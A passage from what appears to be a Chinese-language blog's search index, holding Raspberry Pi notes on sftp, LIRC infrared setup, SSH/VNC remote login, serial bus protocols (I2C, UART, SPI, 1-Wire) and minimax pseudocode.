<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sftp&gt; put README.TXT </span><br><span class="line">Uploading README.TXT to &#x2F;home&#x2F;pi&#x2F;README.TXT</span><br><span class="line">README.TXT                                    100%  606    33.6KB&#x2F;s   00:00</span><br></pre></td></tr></table></figure>
<p>” put “具有类似“ get ”的参数。例如，递归选项“ -r ”可以上传整个文件夹。</p>
</li>
</ol>
<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><ol>
<li>华华. <a href="https://linuxstory.org/how-to-use-sftp-to-securely-transfer-files-with-a-remote-server/" target="_blank" rel="noopener">手把手教你使用 SFTP 安全地传输文件</a>.2015-12-5.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>树莓派</tag>
      </tags>
  </entry>
  <entry>
    <title>树莓派使用lirc进行红外遥控测试</title>
    <url>/2018/12/15/%E6%A0%91%E8%8E%93%E6%B4%BE%E4%BD%BF%E7%94%A8lirc%E8%BF%9B%E8%A1%8C%E7%BA%A2%E5%A4%96%E9%81%A5%E6%8E%A7%E6%B5%8B%E8%AF%95/</url>
    <content><![CDATA[<p>在树莓派上使用lirc进行红外遥控测试的步骤比较繁琐，记录一下以备忘。</p>
<h1 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h1><h2 id="lirc库"><a href="#lirc库" class="headerlink" title="lirc库"></a>lirc库</h2><p>LIRC (Linux Infrared remote control,Linux红外线遥控)是一个开放源代码的包。这个包可以让你的Linux系统能够接收及发送红外线信号。</p>
<p>Microsoft Windows上有个功能相同的软件叫WinLIRC。</p>
<p>利用LIRC和红外线接收器，你就几乎可以用所有的红外线遥控器（例如：电视遥控器）来控制你的计算机。举例来说，你可以用遥控器来控制DVD或音乐的播放。</p>
<h3 id="lirc配置文件说明"><a href="#lirc配置文件说明" class="headerlink" title="lirc配置文件说明"></a>lirc配置文件说明</h3><ul>
<li>/etc/lirc/lircd.conf为遥控器配置文件</li>
<li>/etc/lirc/lircmd.conf为lircmd配置文件，后者可以将遥控器用作鼠标。</li>
<li>/etc/lirc/lircrc为irexec配置文件，后者可以在收到遥控器信号号运行设定的程序。</li>
</ul>
<h3 id="制作遥控器配置文件"><a href="#制作遥控器配置文件" class="headerlink" title="制作遥控器配置文件"></a>制作遥控器配置文件</h3><p>使用irrecord命令制作遥控器配置文件lircd.conf。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 首先停止lirc服务</span><br><span class="line">sudo service lirc stop</span><br><span class="line"></span><br><span class="line"># 制作遥控器配置文件</span><br><span class="line">irrecord -d &#x2F;dev&#x2F;lirc0 &lt;model&gt;.conf</span><br></pre></td></tr></table></figure>

<h1 id="测试过程"><a href="#测试过程" class="headerlink" title="测试过程"></a>测试过程</h1><h2 id="硬件"><a href="#硬件" class="headerlink" title="硬件"></a>硬件</h2><ul>
<li>树莓派3B+</li>
<li>红外接收器</li>
<li>红外遥控器</li>
<li>杜邦线 </li>
</ul>
<h2 id="接线"><a href="#接线" class="headerlink" title="接线"></a>接线</h2><p>红外接收器都有三个引脚：VCC、GND、Data。其中：<br>VCC：连接5V的引脚<br>GND：连接接地的引脚<br>Data：连接GPIO23</p>
<h2 id="lirc配置"><a href="#lirc配置" class="headerlink" title="lirc配置"></a>lirc配置</h2><ol>
<li><p>安装lirc:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install lirc -y</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改/etc/modules</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># &#x2F;etc&#x2F;modules: kernel modules to load at boot time.</span><br><span class="line">#</span><br><span class="line"># This file contains the names of kernel modules that should be loaded</span><br><span class="line"># at boot time, one per line. Lines beginning with &quot;#&quot; are ignored.</span><br><span class="line"></span><br><span class="line">i2c-dev</span><br><span class="line"># 添加如下代码</span><br><span class="line">lirc_dev</span><br><span class="line">lirc_rpi gpio_in_pin&#x3D;23 gpio_out_pin&#x3D;22</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改/etc/lirc/lirc_options.conf</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 修改如下两项</span><br><span class="line">driver          &#x3D; default </span><br><span class="line">device          &#x3D; &#x2F;dev&#x2F;lirc0</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改/boot/config.txt<br>在/boot/config.txt文件中找到#dtoverlay=lirc-rpi，将其修改如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dtoverlay&#x3D;lirc-rpi:gpio_in_pin&#x3D;23,gpio_out_pin&#x3D;22</span><br></pre></td></tr></table></figure>
</li>
<li><p>重启测试</p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo init 6</span><br><span class="line"># 查看lirc是否加载成功</span><br><span class="line">lsmod | grep lirc</span><br><span class="line">ls &#x2F;dev&#x2F;lirc0</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zh.wikipedia.org/zh-hans/LIRC" target="_blank" rel="noopener">LIRC</a>,by wikipedia.</li>
<li><a href="https://blog.newnius.com/raspberry-3b-setup-lirc.html" target="_blank" rel="noopener">树莓派—红外遥控设置</a>,by 逍遥游.</li>
<li><a href="https://cnly.github.io/2016/07/30/raspi-lirc.html" target="_blank" rel="noopener">配置树莓派上的lirc(Raspbian, 2016)</a>,by Cnly.</li>
<li><a href="https://blog.csdn.net/tennysonsky/article/details/45174981" target="_blank" rel="noopener">上拉电阻和下拉电阻的作用</a>,by Mike江.</li>
<li><a href="https://www.imzjy.com/blog/2016-06-26-pullup-resistor" target="_blank" rel="noopener">上拉电阻和下拉电阻</a>,by imzjy.</li>
<li><a href="https://learn.sparkfun.com/tutorials/raspberry-gpio/python-rpigpio-api" target="_blank" rel="noopener">Raspberry gPIo</a>,by sparkfun.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>树莓派</tag>
      </tags>
  </entry>
  <entry>
    <title>树莓派学习之远程登录</title>
    <url>/2018/11/07/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95/</url>
    <content><![CDATA[<p>每次通过USB转串口登录树莓派比较麻烦，可以设置树莓派开启ssh和vnc服务，以便通过ssh或vnc远程登录树莓派。下面介绍在Debian中通过ssh或vnc远程登录树莓派的过程。</p>
<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h2><p>Secure Shell（安全外壳协议，简称SSH）是一种加密的网络传输协议，可在不安全的网络中为网络服务提供安全的传输环境。SSH通过在网络中创建安全隧道来实现SSH客户端与服务器之间的连接。SSH最常见的用途是远程登录系统，人们通常利用SSH来传输命令行界面和远程执行命令。</p>
<h3 id="SSH基本用法"><a href="#SSH基本用法" class="headerlink" title="SSH基本用法"></a>SSH基本用法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 以用户名user，登录远程主机host</span><br><span class="line">$ ssh user@host</span><br><span class="line"># SSH的默认端口是22。使用p参数，可以修改这个端口。</span><br><span class="line">$ ssh -p 2222 user@host</span><br></pre></td></tr></table></figure>

<h3 id="SSH通信过程及风险"><a href="#SSH通信过程及风险" class="headerlink" title="SSH通信过程及风险"></a>SSH通信过程及风险</h3><p>SSH采用了公钥加密保证安全。</p>
<p>整个过程是这样的：（1）远程主机收到用户的登录请求，把自己的公钥发给用户。（2）用户使用这个公钥，将登录密码加密后，发送回来。（3）远程主机用自己的私钥，解密登录密码，如果密码正确，就同意用户登录。</p>
<p>这个过程本身是安全的，但是实施的时候存在”中间人攻击”风险：如果有人截获了登录请求，然后冒充远程主机，将伪造的公钥发给用户，那么用户很难辨别真伪。因为不像https协议，SSH协议的公钥是没有证书中心（CA）公证的，也就是说，都是自己签发的。</p>
<h2 id="VNC"><a href="#VNC" class="headerlink" title="VNC"></a>VNC</h2><p>VNC（Virtual Network Computing），为一种使用RFB协议的显示屏画面分享及远程操作软件。此软件借由网上，可发送键盘与鼠标的动作及即时的显示屏画面。</p>
<p>VNC与操作系统无关，因此可跨平台使用，例如可用Windows连线到某Linux的计算机，反之亦同。甚至在没有安装客户端程序的计算机中，只要有支持JAVA的浏览器，也可使用。</p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>VNC系统由客户端，服务端和一个协议组成</p>
<p>VNC的服务端目的是分享其所运行机器的屏幕，服务端被动的允许客户端控制它。VNC客户端（或Viewer）观察控制服务端，与服务端交互。VNC协议Protocol（RFB）是一个简单的协议，传送服务端的原始图像到客户端（一个X,Y位置上的正方形的点阵数据），客户端传送事件消息到服务端。</p>
<p>服务器发送小方块的帧缓存给客户端，在最简单的情况，VNC协议使用大量的带宽，因此各种各样的方法被发明出来减少通讯的开支，举例来说，有各种各样的编码方法来决定最有效率的方法来传送这些点阵方块。</p>
<p>VNC默认使用TCP端口5900至5906，而JAVA的VNC客户端使用5800至5806。一个服务端可以在5900端口用“监听模式”连接一个客户端，使用监听模式的一个好处是服务端不需要设置防火墙。</p>
<h3 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h3><p>VNC并非是安全的协议，虽然VNC伺服程序需设置密码才可接受外来连线，且VNC客户端与VNC伺服程序之间的密码传输经过加密，但仍可被轻易的拦截到并使用暴力破解法破解。不过VNC可设计以SSH或VPN传输，以增加安全性。</p>
<h3 id="VNC软件"><a href="#VNC软件" class="headerlink" title="VNC软件"></a>VNC软件</h3><p>由于VNC以GPL授权，派生出了几个VNC软件：</p>
<ul>
<li>RealVNC：由VNC团队部分成员开发，分为全功能商业版及免费版。</li>
<li>TightVNC：强调节省带宽使用。</li>
<li>UltraVNC：加入了TightVNC的部分程序及加强性能的图型映射驱动程序，并结合Active Directory及NTLM的账号密码认证，但仅有Windows版本。</li>
<li>Vine Viewer：MacOSX的VNC客户端。</li>
</ul>
<h1 id="配置树莓派支持SSH和VNC"><a href="#配置树莓派支持SSH和VNC" class="headerlink" title="配置树莓派支持SSH和VNC"></a>配置树莓派支持SSH和VNC</h1><p>通过USB转串口登录树莓派后，按如下步骤开启SSH和VNC：</p>
<ol>
<li>运行命令raspi-config<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo raspi-config</span><br></pre></td></tr></table></figure></li>
<li>选择第五项Interfacing Options</li>
<li>选择enable SSH</li>
<li>启用SSH，重复步骤一和二，再选择enable VNC。  </li>
</ol>
<h1 id="通过SSH或VNC连接树莓派"><a href="#通过SSH或VNC连接树莓派" class="headerlink" title="通过SSH或VNC连接树莓派"></a>通过SSH或VNC连接树莓派</h1><p>debian主机与树莓派在同一个局域网内，则按如下步骤通过SSH或VNC连接树莓派。</p>
<h2 id="通过nmap命令获取树莓派ip地址"><a href="#通过nmap命令获取树莓派ip地址" class="headerlink" title="通过nmap命令获取树莓派ip地址"></a>通过nmap命令获取树莓派ip地址</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ nmap 192.168.0.1&#x2F;24</span><br><span class="line">Starting Nmap 7.70 ( https:&#x2F;&#x2F;nmap.org ) at 2018-11-08 13:08 CST</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.0.103</span><br><span class="line">Host is up (0.041s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22&#x2F;tcp   open  ssh</span><br><span class="line">5900&#x2F;tcp open  vnc</span><br><span class="line"></span><br><span class="line">Nmap done: 256 IP addresses (6 hosts up) scanned in 35.77 seconds</span><br></pre></td></tr></table></figure>
<p>开启22和5900端口的主机即是树莓派。</p>
<h2 id="通过ssh远程登录树莓派"><a href="#通过ssh远程登录树莓派" class="headerlink" title="通过ssh远程登录树莓派"></a>通过ssh远程登录树莓派</h2> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 首次登录会给出主机认证不能建立的提示，输入yes可继续，再输入用户密码即可远程登录树莓派</span><br><span class="line">$ ssh pi@192.168.0.103</span><br></pre></td></tr></table></figure>

<h2 id="通过vnc远程登录树莓派"><a href="#通过vnc远程登录树莓派" class="headerlink" title="通过vnc远程登录树莓派"></a>通过vnc远程登录树莓派</h2><ol>
<li><p>通过ssh登录树莓派后查看其使用的vnc程序</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ apt list --installed | grep vnc</span><br><span class="line">realvnc-vnc-server&#x2F;now 6.3.1.36657 armhf [已安装，可升级至：6.3.2.39069]</span><br><span class="line"># 可知，树莓派上使用realvnc程序</span><br></pre></td></tr></table></figure>
</li>
<li><p>在Debian上安装realvnc客户端程序realvnc-vnc-viewer</p>
</li>
<li><p>在终端输入vncviewer，输入树莓派ip、用户名、密码即可登录树莓派</p>
</li>
</ol>
<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><ol>
<li><a href="http://www.ruanyifeng.com/blog/2011/12/ssh_remote_login.html" target="_blank" rel="noopener">SSH原理与运用（一）：远程登录</a>,by 阮一峰.</li>
<li><a href="https://zh.wikipedia.org/zh-hans/Secure_Shell" target="_blank" rel="noopener">Secure Shell</a>,by wikipedia.</li>
<li><a href="https://zh.wikipedia.org/zh-hans/VNC" target="_blank" rel="noopener">VNC</a>,by wikipedia.</li>
<li><a href="https://zhuanlan.zhihu.com/p/71536075" target="_blank" rel="noopener">VPN原理与简单应用</a>,by 新盟-胡巴.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>树莓派</tag>
      </tags>
  </entry>
  <entry>
    <title>树莓派学习笔记</title>
    <url>/2018/11/03/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="WiringPi简介"><a href="#WiringPi简介" class="headerlink" title="WiringPi简介"></a>WiringPi简介</h1><p>WiringPi是应用于树莓派平台的GPIO控制库函数，WiringPi遵守GUN Lv3。wiringPi使用C或者C++开发并且可以被其他语言包转，例如python、ruby或者PHP等。WiringPi中的函数类似于Arduino的wiring系统，这使得熟悉arduino的用户使用wringPi更为方便。</p>
<p>树莓派具有26个普通输入和输出引脚。在这26个引脚中具有8个普通输入和输出管脚，这8个引脚既可以作为输入管脚也可以作为输出管脚。除此之外，树莓派还有一个2线形式的I2C、一个4线形式的SPI和一个UART接口。树莓派上的I2C和SPI接口也可以作为普通端口使用。如果串口控制台被关闭便可以使用树莓派上的UART功能。如果不使用I2C，SPI和UART等复用接口，那么树莓派总共具有8+2+5+2 =17个普通IO。</p>
<p>wiringPi包括一套gpio控制命令，使用gpio命令可以控制树莓派GPIO管脚。用户可以利用gpio命令通过shell脚本控制或查询GPIO管脚。wiringPi是可以扩展的，可以利用wiringPi的内部模块扩展模拟量输入芯片，可以使用MCP23x17/MCP23x08（I2C 或者SPI）扩展GPIO接口。另外可通过树莓派上的串口和Atmega（例如arduino等）扩展更多的GPIO功能。另外，用户可以自己编写扩展模块并把自定义的扩展模块集成到wiringPi中。WiringPi支持模拟量的读取和设置功能，不过在树莓派上并没有模拟量设备。但是使用WiringPi中的软件模块却可以轻松地应用AD或DA芯片。</p>
<h1 id="I2C"><a href="#I2C" class="headerlink" title="I2C"></a>I2C</h1><p>I²C（Inter-Integrated Circuit）字面上的意思是集成电路之间，它其实是I²C Bus简称，所以中文应该叫集成电路总线，它是一种串行通信总线，使用多主从架构，由飞利浦公司在1980年代为了让主板、嵌入式系统或手机用以连接低速周边设备而发展。I²C的正确读法为“I平方C”（”I-squared-C”），而“I二C”（”I-two-C”）则是另一种错误但被广泛使用的读法。自2006年10月1日起，使用I²C协议已经不需要支付专利费，但制造商仍然需要付费以获取I²C从属设备地址。</p>
<h2 id="设计说明"><a href="#设计说明" class="headerlink" title="设计说明"></a>设计说明</h2><p>I²C只使用两条双向漏极开路（Open Drain）（串行数据（SDA）及串行时钟频率（SCL））并利用电阻将电位上拉。I²C允许相当大的工作电压范围，但典型的电压准位为+3.3V或+5v。</p>
<p>I²C的参考设计使用一个7比特长度的地址空间但保留了16个地址，所以在一组总线最多可和112个节点通信[a]。常见的I²C总线依传输速率的不同而有不同的模式：标准模式（100 Kbit/s）、低速模式（10 Kbit/s），但时钟频率可被允许下降至零，这代表可以暂停通信。而新一代的I²C总线可以和更多的节点（支持10比特长度的地址空间）以更快的速率通信：快速模式（400 Kbit/s）、高速模式（3.4 Mbit/s）。</p>
<p>虽然最大的节点数目是被地址空间所限制住，但实际上也会被总线上的总电容所限制住，一般而言为400 pF。</p>
<p align="center">
    <img src="images/File_I2C_data_transfer.png" width="90%" alt="I²C通信"/>
</p>

<p>如上所述，参考设计为使用串行数据线（SDA）和串行时钟线（SCL）、拥有7bit寻址空间的总线。 总线上有两种类型角色的节点：</p>
<ul>
<li>主节点 - 产生时钟并发起与从节点的通信</li>
<li>从节点 - 接收时钟并响应主节点的寻址</li>
</ul>
<p>该总线是一种多主控总线，即可以在总线上放置任意多主节点。此外，在停止位（STOP）发出后，一个主节点也可以成为从节点，反之亦然。</p>
<p>总线上有四种不同的操作模式，虽然大部分设备只作为一种角色和使用其中两种操作模式：</p>
<ul>
<li>主节点发送 - 主节点发送数据给从节点</li>
<li>主节点接收 - 主节点接收从节点数据</li>
<li>从节点发送 - 从节点发送数据给主节点</li>
<li>从节点接收 - 从节点接收主节点数据</li>
</ul>
<p>一开始，主节点处于主节点发送模式，发送起始位（START），跟着发送希望与之通信的从节点的7bit位地址，最后再发送一个bit读写位，该数据位表示主节点想要与从节点进行读（1）还是写（0）操作。</p>
<p>如果从节点在总线上，它将以ACK字符比特位应答（低有效）该地址。主节点收到应答后，根据它发送的读写位，处于发送模式或者接收模式，从节点则处于对应的相反模式（接收或发送）。</p>
<p>地址和数据首先发送最高有效位。 起始位在SCL位高时，由SDA上电平从高变低表示；停止位在SCL为高时，由SDA上电平从低变高表示。其他SDA上的电平变化在SCL为低时发生。</p>
<p>如果主节点想要向从节点写数据，它将发送一个字节，然后从节点以ACK位应答，如此重复。此时，主节点处于主节点发送模式，从节点处于从节点接收模式。</p>
<p>如果主节点想要读取从节点数据，它将不断接收从节点发送的一个个字节，在收到每个字节后发送ACK进行应答，除了接收到的最后一个字节。此时，主节点处于主节点接收模式，从节点处于从节点发送模式。</p>
<p>此后，主节点要么发送停止位终止传输，要么发送另一个START比特以发起另一次传输（即“组合消息”）。</p>
<h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><p>I²C被应用在简单且其制造成本较传输速度更为重要的外设上。一些常见的应用如下：</p>
<ul>
<li>为了保存用户的设置而访问NVRAM芯片。</li>
<li>访问低速的数字模拟转换器（DAC）。</li>
<li>访问低速的模拟数字转换器（ADC）。</li>
<li>改变监视器的对比度、色调及色彩平衡设置（视频数据通道）。</li>
<li>改变音量大小。</li>
<li>获取硬件监视及诊断数据，例如中央处理器的温度及风扇转速。</li>
<li>读取实时时钟（Real-time clock）。</li>
<li>在系统设备中用来打开或关闭电源供应。</li>
</ul>
<p>I²C的另一个强大用途在于微控制器的应用，利用两根通用的输入输出接脚及软件的规划，可以让微控制器控制一个小型网络。</p>
<p>外设可以在系统仍然在运作的同时加入或移出总线，这代表对于有热插拔需求的设备而言是个理想的总线。</p>
<p>像I²C这样的总线之所以流行起来，是因为计算机工程师发现到对于集成电路设计而言，许多的制造成本源自于封装尺寸及接脚数量。更小的包装通常能够减少重量及电源的消耗，这对于移动电话及手持式计算机而言格外重要。</p>
<h1 id="UART"><a href="#UART" class="headerlink" title="UART"></a>UART</h1><p>在通信和计算机科学中，Serial communication是一个通用概念，泛指所有的串行的通信协议，如RS232、USB、I2C、SPI、1-Wire、Ethernet等。这里的串行（serial），是相对并行通信（parallel communication）来说的，如下图：</p>
<p align="center">
    <img src="images/serial_parallel.jpg" width="60%" alt="串行与并行通信"/>
</p>

<p>理解串行通信的概念之后，大家可能会有疑问：接收方接收到一长串的、表示0/1电平跳变的信号之后，怎么还原出有效的信息呢？有两种方法：</p>
<ul>
<li><p>发送端在发送串行数据的同时，提供一个时钟信号，并按照一定的约定（例如在时钟信号的上升沿的时候，将数据发送出去）发送数据，接收端根据发送端提供的时钟信号，以及大家的约定，接收数据。这就是常说的同步串行通信（Synchronous serial communication），I2C、SPI等有时钟信号的协议，都属于这种通信方式。本文不再详述。</p>
</li>
<li><p>发送端在数据发送之前和之后，通过特定形式的信号（例如START信号和STOP信号），告诉接收端，可以开始（或者停止）接收数据了。与此同时，收发两方会约定一个数据发送的速度（就是大名鼎鼎的波特率），发送端在发送START信号之后，就按照固定的节奏发送串行数据，与此同时，接收端在收到START信号之后，也按照固定的节奏接收串行数据。这就是常说的异步串行通信（Asynchronous serial communication），我们本节的主角—-串口通信，就是这种通信方式。</p>
</li>
</ul>
<p>UART(Universal Asynchronous Receiver/Transmitter) 即是规定编码格式、bit rate，产生通信所需的bit流的标准。</p>
<h1 id="SPI"><a href="#SPI" class="headerlink" title="SPI"></a>SPI</h1><p>串行外设接口（Serial Peripheral Interface Bus，SPI），是一种用于短程通信的同步串行通信接口规范，主要应用于单片机系统中。类似I²C。 这种接口首先被Motorola（摩托罗拉）公司开发，然后发展成了一种行业规范。典型应用包含SD卡和液晶显示器。 SPI设备之间使用全双工模式通信，包含一个主机和一个或多个从机。主机产生待读或待写的帧数据，多个从机通过一个片选线路 决定哪个来响应主机的请求。 有时SPI接口被称作四线程接口，SPI准确来讲称为同步串行接口，但是与同步串行接口协议（SSI）不同，SSI是一个四线程 同步通信协议，但是使用差分信号输入同时仅提供一个单工通信信道。</p>
<h2 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h2><p>SPI总线规定了4个保留逻辑信号接口：</p>
<ul>
<li>SCLK（Serial Clock）：串列时脉，由主机发出</li>
<li>MOSI（Master Output,Slave Input）：主机输出从机输入信号，由主机发出</li>
<li>MISO（Master Input,Slave Output）：主机输入从机输出信号，由从机发出</li>
<li>SS（Slave Selected）：选择信号，由主机发出，一般是低电位有效</li>
</ul>
<p>尽管上面的引脚名称是最常用的，但在过去，有时会使用其他引脚命名约定，因此旧IC产品的SPI端口引脚名称可能有所不同。</p>
<h1 id="1-Wire"><a href="#1-Wire" class="headerlink" title="1-Wire"></a>1-Wire</h1><p>1-Wire是Maxim子公司达拉斯半导体的专利技术，仅用单一信号线就可像I²C、SPI一样，传输时钟（clock）又传输数据（data），并且数据传输是双向的。1-Wire使用较低的数据传输速率，通常是用来沟通小型设备，如数字温度计。1-Wire有两种速率：标准模式16kbps，驱动模式142kbps。</p>
<p>单总线只有一根数据线。设备主机或从机通过一个漏极开路或三态端口连接至该数据线，这样允许设备在不发送数据时释放数据总线，以便总线被其它设备所使用。单总线端口为漏极开路其内部等效电路如下图所示。</p>
<p align="center">
    <img src="images/1wire.png" width="90%" alt="单总线硬件接口示意图"/>
</p>

<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><ol>
<li><a href="https://blog.csdn.net/xukai871105/article/details/17737005" target="_blank" rel="noopener">树莓派学习笔记——wiringPi简介、安装和管脚说明</a> , by xukai871105.</li>
<li><a href="https://zh.wikipedia.org/wiki/I%C2%B2C" target="_blank" rel="noopener">I²C</a>, by wikipedia.</li>
<li><a href="https://zhuanlan.zhihu.com/p/25893717" target="_blank" rel="noopener">UART、RS232、TTL关系浅析</a>, by 老狼.</li>
<li><a href="https://zh.wikipedia.org/wiki/序列周邊介面" target="_blank" rel="noopener">串行外设接口</a>,by wikipedia.</li>
<li><a href="https://zh.wikipedia.org/wiki/1-Wire" target="_blank" rel="noopener">1-Wire</a>,by wikipedia.</li>
<li><a href="https://blog.csdn.net/ce123_zhouwei/article/details/6930439" target="_blank" rel="noopener">1-Wire单总线的基本原理</a>,by ce123.</li>
<li><a href="https://blog.csdn.net/zhengqijun_/article/details/52505931" target="_blank" rel="noopener">解析单总线协议（1-wire）</a>,by zhengqijun_.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>硬件</tag>
        <tag>树莓派</tag>
      </tags>
  </entry>
  <entry>
    <title>极大极小算法</title>
    <url>/2022/02/13/%E6%9E%81%E5%A4%A7%E6%9E%81%E5%B0%8F%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<p>Minimax算法又名极小化极大算法，是一种找出失败的最大可能性中的最小值的算法。常用于棋类等由两方较量的游戏和程序。该算法是一个零总和算法，即一方要在可选的选项中选择将其优势最大化的选择，另一方则选择令对手优势最小化的方法。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function minimax(node, depth)</span><br><span class="line">    if node is a terminal node or depth &#x3D; 0</span><br><span class="line">        return the heuristic value of node</span><br><span class="line">    if the adversary is to play at node</span><br><span class="line">        let α :&#x3D; +∞</span><br><span class="line">        foreach child of node</span><br><span class="line">            α :&#x3D; min(α, minimax(child, depth-1))</span><br><span class="line">    else &#123;we are to play at node&#125;</span><br><span class="line">        let α :&#x3D; -∞</span><br><span class="line">        foreach child of node</span><br><span class="line">            α :&#x3D; max(α, minimax(child, depth-1))</span><br><span class="line">    return α</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/housong_csdn/article/details/73920746" target="_blank" rel="noopener">一张图读懂极大极小搜索和α-β剪枝</a>,by housong_csdn.</li>
<li><a href="https://zh.wikipedia.org/wiki/%E6%9E%81%E5%B0%8F%E5%8C%96%E6%9E%81%E5%A4%A7%E7%AE%97%E6%B3%95" target="_blank" rel="noopener">极小化极大算法</a>,by wikipedia.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>科研</tag>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title>树莓派学习之USB转串口</title>
    <url>/2018/11/05/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AD%A6%E4%B9%A0%E4%B9%8BUSB%E8%BD%AC%E4%B8%B2%E5%8F%A3/</url>
    <content><![CDATA[<p>最近研究树莓派，需要通过usb转串口去连接树莓派，然后设置其wifi连接。于是将用到计算机硬件知识整理一下，并记录通过usb转串口设置树莓派wifi连接的过程。</p>
<h1 id="硬件知识"><a href="#硬件知识" class="headerlink" title="硬件知识"></a>硬件知识</h1><p>计算机硬件常用接口有并口和串口，对应串行通信和并行通信。串行通信（英语：Serial communication）是指在计算机总线或其他数据信道上，每次传输一个比特数据，并连续进行以上单次过程的通信方式。与之对应的是并行通信，它在串行端口上通过一次同时传输若干比特数据的方式进行通信。</p>
<p>串行通信被用于长距离通信以及大多数计算机网络，在这些应用场合里，电缆和同步化使并行通信实际应用面临困难。凭借着其改善的信号完整性和传播速度，串行通信总线正在变得越来越普遍，甚至在短程距离的应用中，其优越性已经开始超越并行总线不需要串行化组件(serializer)，并解决了诸如时钟偏移（Clock skew）、互联密度（interconnect density）等缺点。PCI到PCI Express的升级就一个例子。</p>
<h2 id="并口"><a href="#并口" class="headerlink" title="并口"></a>并口</h2><p>并行接口，简称并口。并口采用的是25针D形接头。所谓“并行”，是指8位数据同时通过并行线进行传送，这样数据传送速度大大提高，但并行传送的线路长度受到限制，因为长度增加，干扰就会增加，数据也就容易出错，目前，并行接口主要作为打印机端口等。</p>
<h2 id="串口"><a href="#串口" class="headerlink" title="串口"></a>串口</h2><p>串口叫做串行接口，也称串行通信接口，即COM口。按电气标准及协议来分包括RS-232-C、RS-422、RS485、USB等。 RS-232-C、RS-422与RS-485标准只对接口的电气特性做出规定，不涉及接插件、电缆或协议。</p>
<p>串行端口可以用于连接外置调制解调器、绘图仪或串行打印机。它也可以控制台连接的方式连接网络设备，例如路由器和交换机，主要用来配置它们。</p>
<ul>
<li>RS-232-C</li>
</ul>
<p>也称标准接口，是目前最常用的一种串行通讯接口。它是在1970年由美国电子工业协会（EIA）联合贝尔系统、 调制解调器厂家及计算机终端生产厂家共同制定的用于串行通讯的标准。</p>
<p>传统的RS-232-C接口标准有22根线，采用标准25芯D型插头座。自IBM PC/AT开始使用简化了的9芯D型插座。计算机一般有两个串行口：COM1和COM2，9针D形接口通常在计算机后面能看到。现在有很多手机数据线或者物流接收器都采用COM口与计算机相连。</p>
<ul>
<li>RS-422</li>
</ul>
<p>为改进RS-232通信距离短、速率低的缺点，RS-422定义了一种平衡通信接口，将传输速率提高到10Mb/s，传输距离延长到4000英尺（速率低于100kb/s时），并允许在一条平衡总线上连接最多10个接收器。</p>
<ul>
<li>RS-485</li>
</ul>
<p>为扩展应用范围，EIA又于1983年在RS-422基础上制定了RS-485 标准，增加了多点、双向通信能力，即允许多个发送器连接到同一条总线上，同时增加了发送器的驱动能力和冲突保护特性，扩展了总线共模范围，后命名为 TIA/EIA-485-A标准。</p>
<ul>
<li>Universal Serial Bus（通用串行总线）</li>
</ul>
<p>简称USB，是目前计算机上应用较广泛的接口规范，由Intel、Microsoft、Compaq、IBM、NEC、Northern Telcom等几家大厂商发起的新型外设接口标准。USB接口是计算机主板上的一种四针接口，其中中间两个针传输数据，两边两个针给外设供电。USB接口速度快、连接简单、不需要外接电源，传输速度12Mbps，新的USB 2.0可达480Mbps；电缆最大长度5米，USB电缆有4条线：2条信号线，2条电源线，可提供5伏特电源，USB电缆还分屏蔽和非屏蔽两种，屏蔽电缆传输速度可达12Mbps，价格较贵，非屏蔽电缆速度为1.5Mbps，但价格便宜；USB通过串联方式最多可串接127个设备；支持热插拔。最新的规格是USB 3.1。</p>
<ul>
<li>RJ-45接口</li>
</ul>
